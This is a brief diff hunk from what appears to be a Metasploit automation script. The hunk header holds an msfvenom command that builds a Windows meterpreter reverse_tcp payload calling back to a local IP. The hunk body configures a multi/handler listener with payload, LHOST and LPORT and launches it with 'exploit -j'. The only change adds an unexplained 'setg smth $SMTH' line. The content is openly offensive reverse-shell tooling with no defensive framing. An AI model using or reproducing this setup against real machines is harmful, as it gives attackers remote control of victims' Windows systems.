@@ -95,6 +95,7 @@ msfvenom -p windows/meterpreter_reverse_tcp EXITFUNC="thread" LHOST='192.168.68.
 use multi/handler
 # set payload windows/x64/meterpreter/reverse_tcp
 set payload $PAYLOAD
+setg smth $SMTH
 set lhost $LHOST
 set lport $LPORT
 exploit -j
